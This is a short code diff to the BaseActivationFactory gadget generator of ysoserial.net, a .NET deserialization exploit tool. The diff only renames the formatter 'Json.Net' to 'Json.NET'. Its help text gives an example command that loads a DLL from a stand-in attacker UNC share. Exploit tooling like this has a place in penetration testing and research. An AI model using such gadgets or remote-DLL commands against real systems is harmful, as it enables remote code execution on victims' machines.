@@ -21,7 +21,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net" }; // MessagePack should work too
+            return new List<string> { "Json.NET" }; // MessagePack should work too
         }
 
         public override string Name()
@@ -58,7 +58,7 @@ namespace ysoserial.Generators
 
             if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysoserial.exe -g BaseActivationFactory -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
+                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysoserial.exe -g BaseActivationFactory -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
                 Environment.Exit(-1);
             }
 
